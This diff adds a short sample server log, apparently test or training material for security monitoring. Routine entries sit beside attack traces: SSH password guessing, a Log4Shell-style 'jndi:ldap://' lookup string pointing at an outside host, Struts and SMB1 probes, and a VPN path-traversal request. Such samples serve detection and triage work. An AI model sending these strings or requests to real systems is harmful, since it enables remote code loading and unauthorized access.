@@ -1,0 +1,16 @@
+Nov 11 01:58:12 dc-01 NetSetup[640]: Netlogon secure channel established for WS-114
+Nov 11 02:14:07 hmi-line3 sshd[2211]: Failed password for admin from 203.0.113.50 port 51122 ssh2
+Nov 11 02:14:09 hmi-line3 sshd[2211]: Failed password for admin from 203.0.113.50 port 51124 ssh2
+Nov 11 02:14:12 hmi-line3 sshd[2211]: Failed password for root from 203.0.113.50 port 51130 ssh2
+Nov 11 02:14:15 hmi-line3 sshd[2211]: Failed password for operator from 203.0.113.50 port 51134 ssh2
+Nov 11 02:20:41 web-portal tomcat[884]: WARN request header User-Agent contains jndi:ldap://198.51.100.7/a
+Nov 11 02:20:43 web-portal tomcat[884]: ERROR outbound connection attempt to 198.51.100.7:389 blocked by egress policy
+Nov 11 02:45:19 app-srv-07 struts[1502]: WARN Content-Type header contains suspicious expression from 203.0.113.77
+Nov 11 03:02:55 mes-app-01 smbd[1190]: SMB1 negotiate request from 203.0.113.77
+Nov 11 03:02:58 mes-app-01 smbd[1190]: SMB1 session setup failed from 203.0.113.77
+Nov 11 03:10:02 vpn-gw httpd[301]: GET /dana-na/../dana/html5acc/guacamole/ from 203.0.113.91 status 200
+Nov 11 03:30:00 print-01 cupsd[420]: Scheduler started
+Nov 11 04:00:01 backup-01 cron[88]: nightly backup job started
+Nov 11 04:12:44 file-srv-04 sshd[977]: Accepted publickey for svc_backup from 10.20.1.70
+Nov 11 05:00:00 ntp-01 ntpd[55]: time synchronised with upstream
+Nov 11 06:15:20 jump-01 sshd[1301]: Failed password for invalid user test from 203.0.113.50 port 40022 ssh2
